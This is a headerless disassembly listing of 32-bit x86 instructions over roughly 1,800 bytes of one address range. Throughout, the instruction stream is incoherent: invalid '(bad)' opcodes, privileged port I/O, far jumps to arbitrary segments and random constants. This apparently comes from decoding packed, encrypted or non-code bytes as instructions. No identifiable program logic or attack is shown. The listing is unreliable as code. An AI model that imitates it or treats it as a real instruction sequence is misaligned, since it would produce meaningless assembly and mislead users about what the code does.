  4187cf:	cwde   
  4187d0:	pop    ds
  4187d1:	lock lods eax,DWORD PTR ds:[esi]
  4187d3:	push   ebx
  4187d4:	xchg   esi,eax
  4187d5:	xchg   ebp,eax
  4187d6:	mov    dh,0x62
  4187d8:	bound  edi,QWORD PTR [edx-0x74]
  4187db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187dc:	push   ss
  4187dd:	xchg   ecx,eax
  4187de:	mov    ds,eax
  4187e0:	jmp    ecx
  4187e2:	shl    BYTE PTR [ecx-0x3],1
  4187e5:	aad    0x7d
  4187e7:	cmp    al,0x82
  4187e9:	dec    eax
  4187ea:	jns    0x4187c4
  4187ec:	xchg   edx,eax
  4187ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187ee:	sub    BYTE PTR ds:0x27d29101,bh
  4187f4:	lock ficom WORD PTR [edi-0x43737822]
  4187fb:	push   es
  4187fc:	pop    es
  4187fd:	xchg   ebp,eax
  4187fe:	fcom   st(0)
  418800:	pop    esi
  418801:	jmp    0x418863
  418803:	mov    ecx,DWORD PTR [ebx+eiz*1]
  418806:	inc    edx
  418807:	adc    bh,BYTE PTR [ebx+0x36]
  41880a:	ss sub al,0x45
  41880d:	push   esi
  41880e:	loopne 0x418814
  418810:	and    al,0x37
  418812:	jmp    0x4187e9
  418814:	inc    esi
  418815:	hlt    
  418816:	enter  0xaee4,0xda
  41881a:	out    dx,eax
  41881b:	out    dx,al
  41881c:	mov    esp,0x544efe2f
  418821:	scas   eax,DWORD PTR es:[edi]
  418822:	cmc    
  418823:	ss xchg edi,eax
  418825:	mov    dl,0xf4
  418827:	lahf   
  418828:	jg     0x4188a2
  41882a:	dec    edi
  41882b:	jno    0x4187d8
  41882d:	pop    edi
  41882e:	loope  0x418805
  418830:	leave  
  418831:	fwait
  418832:	sbb    al,BYTE PTR [eax]
  418834:	pop    esi
  418835:	arpl   WORD PTR [edx-0x6d72a11],cx
  41883b:	or     eax,0x41c701b3
  418840:	mov    dh,0x15
  418842:	inc    DWORD PTR [ebp+0x49062fa7]
  418848:	jne    0x418816
  41884a:	pushf  
  41884b:	pop    esp
  41884c:	cwde   
  41884d:	scas   eax,DWORD PTR es:[edi]
  41884e:	pushf  
  41884f:	jp     0x418803
  418851:	std    
  418852:	adc    edi,DWORD PTR [edx]
  418854:	push   cs
  418855:	cmp    DWORD PTR ds:[esp+ecx*8+0x7f],ebp
  41885a:	sub    ch,BYTE PTR [ebx-0x64]
  41885d:	mov    al,BYTE PTR [esi-0xf06389d]
  418863:	int3   
  418864:	adc    DWORD PTR [esi-0x93e4d07],ebx
  41886a:	not    ebx
  41886c:	out    dx,eax
  41886d:	and    al,0x90
  41886f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418870:	int3   
  418871:	in     eax,dx
  418872:	or     BYTE PTR [ecx+0x7bb05ddb],bl
  418878:	push   edi
  418879:	into   
  41887a:	loope  0x41882d
  41887c:	es dec edi
  41887e:	sahf   
  41887f:	call   0xb2db3b34
  418884:	sti    
  418885:	mov    esi,0xc44e760d
  41888a:	in     al,dx
  41888b:	pi2fd  mm4,QWORD PTR [ebx+0x54]
  418890:	sub    eax,0xc3822d1a
  418895:	mov    ds:0x442426b4,al
  41889a:	jl     0x4188e2
  41889c:	push   0x53
  41889e:	jb     0x4188db
  4188a0:	sar    cl,0x21
  4188a3:	loop   0x4188e2
  4188a5:	call   0xf52c:0xd1a0c404
  4188ac:	xchg   esi,eax
  4188ad:	js     0x4188a3
  4188af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188b0:	loop   0x41888e
  4188b2:	in     eax,0x1a
  4188b4:	inc    ebp
  4188b5:	mov    WORD PTR cs:[ebp-0x4a],cs
  4188b9:	fdiv   DWORD PTR [ebp-0x31308f3d]
  4188bf:	nop
  4188c0:	inc    esi
  4188c1:	cwde   
  4188c2:	adc    BYTE PTR [ebx],ch
  4188c4:	adc    DWORD PTR [esi+0x21],0xffffffd6
  4188c8:	adc    eax,0x344a2c78
  4188cd:	sub    BYTE PTR [ebp+0x722d8d16],al
  4188d3:	dec    edx
  4188d4:	gs in  al,0x8a
  4188d7:	loop   0x4188bb
  4188d9:	sbb    DWORD PTR [ecx],ebp
  4188db:	cmp    al,0x78
  4188dd:	push   ebp
  4188de:	(bad)  
  4188df:	or     eax,0x8acd9488
  4188e4:	inc    esi
  4188e5:	inc    ecx
  4188e6:	addr16 pusha 
  4188e8:	stc    
  4188e9:	ja     0x4188ca
  4188eb:	call   0xeac867a3
  4188f0:	inc    esp
  4188f1:	sbb    eax,0x546950f1
  4188f6:	lock js 0x418973
  4188f9:	jge    0x418882
  4188fb:	mov    ds:0xbe0a054c,eax
  418900:	hlt    
  418901:	xor    al,BYTE PTR [esi-0x7a]
  418904:	pop    esi
  418905:	sbb    al,0xb8
  418907:	xchg   ecx,eax
  418908:	mov    dl,0x97
  41890a:	and    al,0x46
  41890c:	or     DWORD PTR [edx],edx
  41890e:	xor    BYTE PTR [edx],cl
  418910:	add    edx,DWORD PTR [esp+edx*2]
  418913:	and    eax,DWORD PTR [ebx+0x67]
  418916:	mov    ds:0x5df6543,eax
  41891b:	ds jo  0x4188c6
  41891e:	mov    ch,0xde
  418921:	cmp    al,0xb6
  418923:	jns    0x41892f
  418925:	and    al,0xc7
  418927:	xchg   edx,eax
  418928:	shr    edi,1
  41892a:	inc    edi
  41892b:	je     0x41895c
  41892d:	out    dx,al
  41892e:	popa   
  41892f:	jmp    0x4188ca
  418931:	femms  
  418933:	jne    0x4188d6
  418935:	push   ds
  418936:	popf   
  418937:	cwde   
  418938:	stos   DWORD PTR es:[edi],eax
  418939:	jl     0x418939
  41893b:	lock pop es
  41893d:	sbb    edi,DWORD PTR [edi+0x62]
  418940:	daa    
  418941:	stos   BYTE PTR es:[edi],al
  418942:	fisttp QWORD PTR [ebp-0x6b]
  418945:	push   cs
  418946:	(bad)  
  418947:	stc    
  418948:	sahf   
  418949:	pop    ebx
  41894a:	inc    eax
  41894b:	lock aaa 
  41894d:	xchg   ebp,eax
  41894e:	aaa    
  41894f:	and    eax,0xf16b5c00
  418954:	pop    edi
  418955:	in     eax,0x64
  418957:	sahf   
  418958:	fwait
  418959:	push   ebp
  41895a:	lock push edi
  41895c:	fcomp  QWORD PTR [esi+0x5a]
  41895f:	cld    
  418960:	xor    esi,DWORD PTR [edx+0x55e0f07a]
  418966:	lds    edi,FWORD PTR [edi]
  418968:	jne    0x418913
  41896a:	jns    0x418956
  41896c:	stc    
  41896d:	into   
  41896e:	jg     0x418981
  418970:	aam    0xa3
  418972:	pop    ds
  418973:	jmp    0xec7f:0x50ff4fd5
  41897a:	cmp    DWORD PTR [edx+0x168c31c6],esi
  418980:	jmp    0xe41f:0xe3a3e352
  418987:	scas   eax,DWORD PTR es:[edi]
  418988:	mov    esi,0x3c3aa6da
  41898d:	inc    esp
  41898e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41898f:	fbld   TBYTE PTR [eax+0x7cebcbf]
  418995:	aas    
  418996:	pop    ecx
  418997:	loope  0x4189fd
  418999:	jecxz  0x4189ca
  41899b:	fcom   DWORD PTR [ecx-0x15]
  41899e:	icebp  
  41899f:	inc    eax
  4189a0:	mov    dl,0x83
  4189a2:	idiv   eax
  4189a4:	dec    edi
  4189a5:	repz int 0xb3
  4189a8:	ins    DWORD PTR es:[edi],dx
  4189a9:	out    0xd7,al
  4189ab:	test   BYTE PTR [edx+eiz*2+0x26],bl
  4189af:	ja     0x4189bc
  4189b1:	xchg   ebx,eax
  4189b2:	adc    ecx,DWORD PTR [ebp-0x5e]
  4189b5:	shl    BYTE PTR [eax+0x74],0x86
  4189b9:	xchg   esi,eax
  4189ba:	cs cmc 
  4189bc:	retf   0x4a90
  4189bf:	mov    al,0x4a
  4189c1:	inc    edx
  4189c2:	dec    esp
  4189c3:	outs   dx,BYTE PTR ds:[esi]
  4189c4:	jmp    0x4189f2
  4189c6:	cmc    
  4189c7:	loopne 0x4189c5
  4189c9:	lock inc ebp
  4189cb:	loop   0x418a15
  4189cd:	inc    eax
  4189ce:	sub    esi,esi
  4189d0:	cwde   
  4189d1:	sub    DWORD PTR [eax+0x57],0xffffffe7
  4189d5:	(bad)  
  4189d6:	stc    
  4189d7:	repz xor cl,BYTE PTR [esi]
  4189da:	scas   eax,DWORD PTR es:[edi]
  4189db:	adc    al,BYTE PTR ss:[edx+0x67ec30c0]
  4189e2:	sub    BYTE PTR [ebp+0x32db91ce],dh
  4189e8:	push   0x49
  4189ea:	popf   
  4189eb:	dec    eax
  4189ec:	or     DWORD PTR [ebx],edx
  4189ee:	push   ebp
  4189ef:	test   al,0xe8
  4189f1:	and    BYTE PTR [eax],0x30
  4189f4:	push   0x1111a340
  4189f9:	mov    esp,0x800c711b
  4189fe:	sub    eax,0x292a940a
  418a03:	inc    edi
  418a04:	les    esp,FWORD PTR [ebx+0x10]
  418a07:	or     ch,bh
  418a09:	xor    DWORD PTR [esi+0x5d],eax
  418a0c:	jne    0x4189fd
  418a0e:	xchg   ebp,eax
  418a0f:	inc    esi
  418a10:	or     esp,DWORD PTR [ecx+edi*4-0x2dc02019]
  418a17:	mov    WORD PTR es:[edi+edx*1],cs
  418a1b:	aaa    
  418a1c:	dec    ebx
  418a1d:	dec    esi
  418a1e:	mov    eax,ds:0x1d235e3a
  418a23:	pop    edx
  418a24:	lods   al,BYTE PTR ds:[esi]
  418a25:	jae    0x418a8c
  418a27:	test   al,0x3f
  418a29:	and    ch,BYTE PTR [esi]
  418a2b:	retf   
  418a2c:	in     al,0x80
  418a2e:	xchg   esp,eax
  418a2f:	and    DWORD PTR [eax+0x6ef8b4a3],eax
  418a35:	les    ecx,FWORD PTR [ecx]
  418a37:	enter  0x5ad5,0x5
  418a3b:	adc    BYTE PTR [edx],ch
  418a3d:	adc    eax,0x43ad7b45
  418a42:	cmp    ch,ah
  418a44:	mov    bl,0xef
  418a46:	xchg   ebx,eax
  418a47:	(bad)  
  418a49:	lock les eax,FWORD PTR [ecx]
  418a4c:	(bad)  
  418a4d:	fld    QWORD PTR [ebp+0x2a]
  418a50:	mov    ah,0x29
  418a52:	enter  0x2828,0x18
  418a56:	xchg   edx,eax
  418a57:	shl    DWORD PTR [ebp+0x39],1
  418a5a:	stos   DWORD PTR es:[edi],eax
  418a5b:	das    
  418a5c:	out    dx,al
  418a5d:	mov    eax,ds:0x3187c4f5
  418a62:	cs cli 
  418a64:	(bad)  
  418a65:	clc    
  418a66:	push   esp
  418a67:	hlt    
  418a68:	pop    es
  418a69:	idiv   esp
  418a6b:	lock hlt 
  418a6d:	pop    ss
  418a6e:	pop    eax
  418a6f:	mov    edi,DWORD PTR [edx-0xf8f3219]
  418a75:	mov    edi,0x7e577fbd
  418a7a:	or     ecx,DWORD PTR [eax]
  418a7c:	outs   dx,BYTE PTR ds:[esi]
  418a7d:	dec    esi
  418a7e:	ficom  WORD PTR [eax+eax*1-0x3e50d250]
  418a85:	add    edi,DWORD PTR [eax+0x2d]
  418a88:	out    dx,al
  418a89:	mov    esi,0x239071c
  418a8e:	sbb    al,0x5d
  418a90:	shr    BYTE PTR [esi+eax*4-0x631f8595],0x39
  418a98:	icebp  
  418a99:	aam    0x6a
  418a9b:	std    
  418a9c:	les    esi,FWORD PTR [ebx-0x13]
  418a9f:	call   edx
  418aa1:	aam    0xa2
  418aa3:	pop    ds
  418aa4:	out    dx,al
  418aa5:	lea    ebx,[edi+0x7e3644fc]
  418aab:	mov    WORD PTR [esi-0x13],gs
  418aae:	imul   edx,DWORD PTR [edi+ecx*1-0x2327eb51],0x34cbdd5f
  418ab9:	mov    bl,0x7c
  418abb:	sti    
  418abc:	mov    edx,DWORD PTR [ebx]
  418abe:	push   esp
  418abf:	sbb    edi,DWORD PTR [ebx-0x4f]
  418ac2:	inc    ebp
  418ac3:	inc    ecx
  418ac4:	mov    ch,0x16
  418ac6:	xchg   ebx,eax
  418ac7:	(bad)  
  418ac9:	sub    BYTE PTR [edx-0x4c45638e],bh
  418acf:	xor    al,0x70
  418ad1:	in     al,dx
  418ad2:	repz mov bh,0x71
  418ad5:	dec    eax
  418ad6:	jg     0x418a74
  418ad8:	mov    ds:0x34ae2098,al
  418add:	inc    eax
  418ade:	inc    edi
  418adf:	hlt    
  418ae0:	sub    al,0x7c
  418ae2:	addr16 jle 0x418a82
  418ae5:	int    0x8d
  418ae7:	add    DWORD PTR [eax-0xe95efe8],ebx
  418aed:	cmp    BYTE PTR [ebx],0xa6
  418af0:	test   ebx,esi
  418af2:	jmp    0x155d5e87
  418af7:	ficom  DWORD PTR [edi]
  418af9:	cmc    
  418afa:	xor    eax,0x3232882d
  418aff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b00:	ret    0x776d
  418b03:	into   
  418b04:	ror    DWORD PTR [eax+0x61],0x7
  418b08:	fld    QWORD PTR [ecx]
  418b0a:	pop    ebx
  418b0b:	imul   ebx,DWORD PTR ds:0x79acb4a0,0x5e
  418b12:	and    dl,cl
  418b14:	repnz sahf 
  418b16:	fistp  DWORD PTR [ebx-0x44]
  418b19:	jg     0x418b1a
  418b1b:	push   cs
  418b1c:	xchg   edx,eax
  418b1d:	and    BYTE PTR [edx],ah
  418b1f:	adc    al,0x10
  418b21:	int3   
  418b22:	xchg   ebp,eax
  418b23:	jecxz  0x418b9d
  418b25:	out    dx,eax
  418b26:	adc    ecx,edx
  418b28:	mov    al,ds:0xe75d3b6
  418b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b2e:	push   esp
  418b2f:	cmp    DWORD PTR [edx+eax*2],ebp
  418b32:	sar    BYTE PTR [edx-0x71],0x11
  418b36:	sbb    DWORD PTR [ecx-0x7a],esi
  418b39:	in     eax,0x29
  418b3b:	sub    ebp,DWORD PTR [edi+eiz*8+0x74dac72b]
  418b42:	rol    DWORD PTR [eax-0x57514cd],cl
  418b48:	push   esp
  418b49:	popf   
  418b4a:	ret    0x3642
  418b4d:	mov    ah,0xa5
  418b4f:	inc    ebp
  418b50:	fisttp WORD PTR [esi+0x41c547fb]
  418b56:	in     eax,0xe7
  418b58:	sbb    ecx,esi
  418b5a:	mov    cs,WORD PTR [esi+0x28]
  418b5d:	sbb    al,0x28
  418b5f:	out    dx,eax
  418b60:	sbb    BYTE PTR [ecx+0x11],dl
  418b63:	js     0x418b79
  418b65:	xchg   ebp,eax
  418b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b67:	hlt    
  418b68:	sbb    BYTE PTR [esi-0x30fea819],dl
  418b6e:	rcr    DWORD PTR [edi],0xfd
  418b71:	push   ss
  418b72:	xchg   edi,eax
  418b74:	pop    fs
  418b76:	sbb    BYTE PTR [edx],dh
  418b78:	lock xchg edi,eax
  418b7a:	sub    BYTE PTR [edi+eax*2-0x23368929],ah
  418b81:	nop
  418b82:	mov    WORD PTR [esp+ecx*2-0x11d0d4f7],cs
  418b89:	(bad)  
  418b8a:	jmp    0x418b15
  418b8c:	pop    ds
  418b8d:	shl    BYTE PTR [ecx+ecx*8-0x49],0xc6
  418b92:	out    0x2a,al
  418b94:	mov    edi,0x9303e87f
  418b99:	jg     0x418bef
  418b9b:	push   edi
  418b9c:	(bad)  
  418b9e:	ret    0xe554
  418ba1:	xchg   esi,eax
  418ba2:	inc    edi
  418ba3:	jo     0x418bb8
  418ba5:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ba7:	add    al,0x80
  418ba9:	xlat   BYTE PTR ds:[ebx]
  418baa:	pop    eax
  418bab:	fdiv   DWORD PTR [ebx+0x33]
  418bae:	fld    TBYTE PTR [edi+0x6c]
  418bb1:	icebp  
  418bb2:	(bad)  
  418bb3:	pop    ds
  418bb4:	push   edi
  418bb5:	inc    edi
  418bb6:	mov    ds,WORD PTR [ecx+edx*4]
  418bb9:	xchg   DWORD PTR [edi],edx
  418bbb:	push   ss
  418bbc:	je     0x418b89
  418bbe:	jnp    0x418b73
  418bc0:	mov    cl,0x19
  418bc2:	add    al,0xeb
  418bc4:	popf   
  418bc5:	int    0xe8
  418bc7:	fdiv   DWORD PTR [edi]
  418bc9:	xlat   BYTE PTR ds:[ebx]
  418bca:	and    esi,DWORD PTR ds:[ecx-0x4]
  418bce:	mov    bh,0x7b
  418bd0:	jecxz  0x418bf9
  418bd2:	aas    
  418bd3:	popf   
  418bd4:	dec    ebp
  418bd5:	sbb    eax,0xd853e983
  418bda:	fcom   QWORD PTR [ebx+0xee7c10d]
  418be0:	xchg   esp,eax
  418be1:	inc    edi
  418be2:	sub    ecx,ebx
  418be4:	or     ebp,0xffffffc3
  418be7:	fcomp  QWORD PTR [esi+0x5fabe11f]
  418bed:	push   ebx
  418bee:	adc    al,0x85
  418bf0:	jo     0x418bd1
  418bf2:	mov    ebx,0x382a78c7
  418bf7:	lea    ebp,[ecx+0x7c]
  418bfa:	xchg   ebp,eax
  418bfb:	or     DWORD PTR [ebx],eax
  418bfd:	test   eax,0xa1de51cd
  418c02:	inc    esp
  418c03:	xchg   ecx,eax
  418c04:	call   0x75cc713
  418c09:	cmp    ah,dl
  418c0b:	mov    esp,0x83fcdb87
  418c10:	pusha  
  418c11:	cmp    eax,0xba74fb0c
  418c16:	sbb    eax,0x26111f0a
  418c1b:	and    ebp,edx
  418c1d:	dec    eax
  418c1e:	push   ecx
  418c1f:	clc    
  418c20:	push   ss
  418c21:	and    bh,0x8b
  418c24:	das    
  418c25:	ret    0x8fb7
  418c28:	sub    DWORD PTR [edx],esi
  418c2a:	out    dx,eax
  418c2b:	mov    cl,0x8
  418c2d:	dec    esi
  418c2e:	retf   0x7ab8
  418c31:	ins    BYTE PTR es:[edi],dx
  418c32:	outs   dx,BYTE PTR ds:[esi]
  418c33:	pushf  
  418c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c35:	pop    ecx
  418c36:	lds    eax,FWORD PTR [ecx]
  418c38:	outs   dx,BYTE PTR ds:[esi]
  418c39:	xchg   esp,eax
  418c3a:	and    eax,0x268adb70
  418c3f:	inc    edx
  418c40:	xchg   ecx,eax
  418c41:	pop    ebx
  418c42:	ss out 0xd7,eax
  418c45:	sbb    esi,esi
  418c47:	jae    0x418c3f
  418c49:	xor    eax,0xfb9f8d6
  418c4e:	dec    ebp
  418c4f:	adc    ebp,DWORD PTR [eax+0x4b]
  418c52:	sub    al,0x15
  418c54:	retf   0xc11e
  418c57:	mov    dl,0x44
  418c59:	pop    eax
  418c5a:	leave  
  418c5b:	mov    BYTE PTR [edx],ch
  418c5d:	sub    DWORD PTR [ebx-0xd],eax
  418c60:	rol    DWORD PTR [ecx],1
  418c62:	inc    esi
  418c63:	daa    
  418c64:	mov    BYTE PTR [ecx],0xaa
  418c67:	dec    esp
  418c68:	cmp    esp,DWORD PTR [edx+0x2f4aa214]
  418c6e:	popa   
  418c6f:	nop
  418c70:	pop    ss
  418c71:	cld    
  418c72:	stc    
  418c73:	sar    DWORD PTR [esi],1
  418c75:	(bad)  
  418c76:	cs in  eax,0x24
  418c79:	lea    ecx,[edx]
  418c7b:	aad    0xb1
  418c7d:	sbb    al,bl
  418c7f:	fcom   QWORD PTR [ecx-0x1114b4f3]
  418c85:	in     al,dx
  418c86:	mov    ch,ch
  418c88:	mov    edi,0x528e02c2
  418c8d:	sub    BYTE PTR [esi-0x3c],0x13
  418c91:	clc    
  418c92:	xor    bh,BYTE PTR [edi]
  418c94:	pusha  
  418c95:	mov    ebp,0x5432994
  418c9a:	cmc    
  418c9b:	(bad)  
  418c9c:	loopne 0x418caf
  418c9e:	push   ss
  418c9f:	iret   
  418ca0:	sub    al,0xe2
  418ca2:	mov    ch,0x62
  418ca4:	inc    DWORD PTR [ebx+0x6e7bb14f]
  418caa:	mov    WORD PTR [ebp-0x2f],?
  418cad:	or     al,0x6d
  418caf:	jnp    0x418c3b
  418cb1:	pushf  
  418cb2:	ss in  eax,dx
  418cb4:	mov    esp,0x74c22e4d
  418cb9:	jo     0x418cf6
  418cbb:	pop    edx
  418cbc:	lds    ebx,FWORD PTR [edx+ebx*1+0x17e5c13e]
  418cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cc4:	fnstcw WORD PTR [edx-0xe]
  418cc7:	pop    es
  418cc8:	push   ecx
  418cc9:	and    eax,0x6b
  418ccc:	mov    bl,0xb7
  418cce:	push   edi
  418ccf:	jg     0x418cc8
  418cd1:	mov    cs,WORD PTR [edi]
  418cd3:	aad    0xbf
  418cd5:	sbb    al,BYTE PTR [edi]
  418cd7:	push   ecx
  418cd8:	sti    
  418cd9:	jmp    0xf8363fa5
  418cde:	jle    0x418cc6
  418ce0:	push   ss
  418ce1:	pop    ecx
  418ce2:	clc    
  418ce3:	jb     0x418cd7
  418ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ce6:	add    al,0x0
  418ce8:	js     0x418d37
  418cea:	imul   edi,DWORD PTR [esi-0xb909095],0xc1090dfc
  418cf4:	jecxz  0x418d16
  418cf6:	push   ebp
  418cf7:	push   eax
  418cf8:	in     eax,dx
  418cf9:	in     eax,0x65
  418cfb:	std    
  418cfc:	fmul   QWORD PTR [edx]
  418cfe:	push   ecx
  418cff:	cmp    ebp,ebx
  418d01:	and    eax,0xcafafcdf
  418d06:	cmp    DWORD PTR [esi],0x8
  418d09:	dec    esi
  418d0b:	jo     0x418d09
  418d0d:	cld    
  418d0e:	(bad)  
  418d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d10:	adc    ecx,DWORD PTR [edi-0x3b]
  418d13:	push   0xffffffee
  418d15:	adc    al,0x89
  418d17:	mov    DWORD PTR [ecx+0x1a],esi
  418d1a:	cmp    bh,ch
  418d1c:	fldenv ds:[eax]
  418d1f:	daa    
  418d20:	ja     0x418d27
  418d22:	cmp    BYTE PTR [ebx+0x68],al
  418d25:	or     dh,BYTE PTR [esi+0x25]
  418d28:	xor    DWORD PTR [edi],edi
  418d2a:	pop    ebp
  418d2b:	sti    
  418d2c:	pop    ecx
  418d2d:	(bad)  
  418d2e:	fistp  QWORD PTR [edi]
  418d30:	fwait
  418d31:	addr16 jns 0x418d79
  418d34:	jae    0x418d35
  418d36:	jg     0x418d76
  418d38:	(bad)  
  418d39:	cmp    ebp,edi
  418d3b:	adc    eax,0xb4891750
  418d40:	adc    BYTE PTR ds:0x710cd831,al
  418d46:	sahf   
  418d47:	mov    ecx,0xacee1eda
  418d4c:	(bad)  
  418d4e:	js     0x418d88
  418d50:	push   es
  418d51:	push   edx
  418d52:	rcr    BYTE PTR [ebx],1
  418d54:	sub    al,0xb3
  418d56:	ss cmp bl,al
  418d59:	scas   al,BYTE PTR es:[edi]
  418d5a:	loop   0x418dbf
  418d5c:	in     al,dx
  418d5d:	stos   BYTE PTR es:[edi],al
  418d5e:	fisttp WORD PTR [ebx+0x7ed67032]
  418d64:	and    DWORD PTR [ecx-0x4f],0xd96e46c8
  418d6b:	(bad)  
  418d6d:	xor    al,0x8e
  418d6f:	cwde   
  418d70:	fistp  DWORD PTR [edx]
  418d72:	xor    eax,0x48511b32
  418d77:	(bad)  
  418d78:	(bad)  
  418d79:	std    
  418d7a:	add    eax,0xb48599cf
  418d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d80:	fdivr  QWORD PTR [eax+ecx*4]
  418d83:	push   ss
  418d84:	sub    BYTE PTR [eax],0x24
  418d87:	dec    eax
  418d88:	or     al,0x38
  418d8a:	mov    eax,ds:0xd023593e
  418d8f:	push   es
  418d90:	(bad)  
  418d92:	scas   al,BYTE PTR es:[edi]
  418d93:	outs   dx,BYTE PTR ds:[esi]
  418d94:	rcr    DWORD PTR [esi-0x13],1
  418d97:	lock pxor mm5,QWORD PTR [ebp+0x73]
  418d9c:	(bad)  
  418d9d:	pop    esp
  418d9e:	lea    edi,[edx-0x1ca1ce76]
  418da4:	inc    esi
  418da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418da6:	inc    ebx
  418da7:	ins    DWORD PTR es:[edi],dx
  418da8:	jnp    0x418dac
  418daa:	and    ecx,edi
  418dac:	ret    0x7f7b
  418daf:	test   DWORD PTR [esp+edx*8],ecx
  418db2:	mov    ds:0x401e20ca,al
  418db7:	xor    al,0xa2
  418db9:	add    eax,0x2c2f2794
  418dbe:	stos   DWORD PTR es:[edi],eax
  418dbf:	pop    ebx
  418dc0:	mov    gs,WORD PTR [edi]
  418dc2:	pop    ds
  418dc3:	dec    ebx
  418dc4:	mov    ecx,0xeb89e6b4
  418dc9:	or     DWORD PTR [ecx+0x2d],esi
  418dcc:	mov    eax,ds:0x4ed82fd7
  418dd1:	mov    dl,0x58
  418dd3:	inc    edi
  418dd4:	leave  
  418dd5:	add    ecx,DWORD PTR [edx+esi*1+0x3c46380e]
  418ddc:	add    DWORD PTR [edi-0x62],edx
  418ddf:	xchg   edi,eax
  418de0:	xchg   ecx,eax
  418de1:	mov    DWORD PTR [eax],0xba8d6ee5
  418de7:	rcr    DWORD PTR [ecx-0x31],0xd2
  418deb:	fst    DWORD PTR ds:0x4f5840ac
  418df1:	mov    ecx,0x722f87f7
  418df6:	idiv   eax
  418df8:	add    DWORD PTR [edx+0x77],edx
  418dfb:	xchg   edx,eax
  418dfc:	sahf   
  418dfd:	pop    ebp
  418dfe:	mov    ds:0xd4b00ea9,eax
  418e03:	imul   edx,ecx,0x32
  418e06:	mov    bl,BYTE PTR [ecx-0x1368c8a0]
  418e0c:	aaa    
  418e0d:	jmp    0xcf1807cb
  418e12:	push   ds
  418e13:	pusha  
  418e14:	jmp    0x418e07
  418e16:	dec    edi
  418e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e18:	and    ecx,esp
  418e1a:	xchg   edi,eax
  418e1b:	bsf    esi,DWORD PTR [edi-0x14]
  418e1f:	pop    edi
  418e20:	int3   
  418e21:	fnstsw WORD PTR [ecx]
  418e23:	inc    dl
  418e25:	in     eax,0xc2
  418e27:	outs   dx,DWORD PTR ds:[esi]
  418e28:	dec    ebp
  418e29:	cld    
  418e2a:	loope  0x418e1b
  418e2c:	fs mov edi,0x7cbfcbfc
  418e32:	or     eax,DWORD PTR [esi+ebp*4]
  418e35:	adc    edi,ebp
  418e37:	mov    ecx,0xfbee7dcf
  418e3c:	std    
  418e3d:	sbb    esi,edi
  418e3f:	call   0xed5a:0xb5fcc76c
  418e46:	mov    si,WORD PTR [edx-0x4a]
  418e4a:	jmp    eax
  418e4c:	in     eax,0x95
  418e4e:	lahf   
  418e4f:	sbb    edi,DWORD PTR ds:0x34d41c7f
  418e55:	test   al,0x4b
  418e57:	or     ebx,DWORD PTR [eax-0x3ee4341d]
  418e5d:	test   DWORD PTR [esi],ebp
  418e5f:	shl    DWORD PTR [ebx],1
  418e61:	(bad)  
  418e62:	into   
  418e63:	pop    ds
  418e64:	cmp    DWORD PTR [ebx-0x5a],esi
  418e67:	test   DWORD PTR [edi-0x68],0xcdb5fad8
  418e6e:	fstp   QWORD PTR [edi-0x1]
  418e71:	shl    BYTE PTR [eax-0x9],0x57
  418e75:	dec    esp
  418e76:	fsubr  DWORD PTR [ecx+edx*2+0x35]
  418e7a:	or     DWORD PTR [esi+0x29],eax
  418e7d:	sar    BYTE PTR [eiz*2+0x7c294838],cl
  418e84:	dec    esi
  418e85:	pusha  
  418e86:	ja     0x418ee8
  418e88:	xor    dh,BYTE PTR [eax-0x33d77f2f]
  418e8e:	dec    eax
  418e8f:	dec    esp
  418e90:	fwait
  418e91:	pop    es
  418e92:	data16 out dx,al
  418e94:	gs jle 0x418ec2
  418e97:	arpl   di,ax
  418e99:	pop    esi
  418e9a:	(bad)  
  418e9b:	sar    ebp,cl
  418e9d:	outs   dx,DWORD PTR ds:[esi]
  418e9e:	shr    DWORD PTR [edi],1
  418ea0:	jb     0x418ee4
  418ea2:	ins    DWORD PTR es:[edi],dx
  418ea3:	cwde   
  418ea4:	push   0x695e334e
  418ea9:	xor    BYTE PTR [ebx-0x27],dl
  418eac:	int    0x81
  418eae:	cli    
  418eaf:	sbb    eax,0x9a487cf8
  418eb4:	mov    bh,0x19
  418eb6:	mov    edx,0x275bf30e
  418ebb:	sub    BYTE PTR [edx],cl
  418ebd:	dec    ebx
  418ebe:	mov    ds:0x32544d1,eax
  418ec3:	push   esi
  418ec4:	in     eax,0x18
  418ec6:	sub    edi,ebp
  418ec8:	dec    ebx
  418ec9:	sub    al,0xf7
  418ecb:	push   edi
  418ecc:	pop    eax
  418ecd:	pop    ds
  418ece:	jbe    0x418f39
  418ed0:	jae    0x418e53
  418ed2:	or     ecx,0x1d
  418ed5:	ins    BYTE PTR es:[edi],dx
  418ed6:	in     eax,0x1d
  418ed8:	pop    edx
  418ed9:	out    0x1c,al
  418edb:	push   esp
  418edc:	cs icebp 
  418ede:	jecxz  0x418f5b
  418ee0:	pslld  mm2,mm1
  418ee3:	fld    TBYTE PTR [ebx-0x7b491384]
  418ee9:	sti    
  418eea:	ja     0x418ef2
  418eec:	in     al,dx
  418eed:	push   ds
  418eee:	push   ebx
  418eef:	push   esp
  418ef0:	ret    
  418ef1:	mov    WORD PTR [ecx+0x39b0b1c0],ds
  418ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ef8:	mov    ch,0xda
  418efa:	mov    ds:0x91314fdf,eax
  418eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f00:	ss pop ecx
  418f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f03:	fistp  DWORD PTR [esi]
  418f05:	push   eax
  418f06:	shl    dh,1
  418f08:	enter  0x4274,0xa0
  418f0c:	cmp    al,0x4a
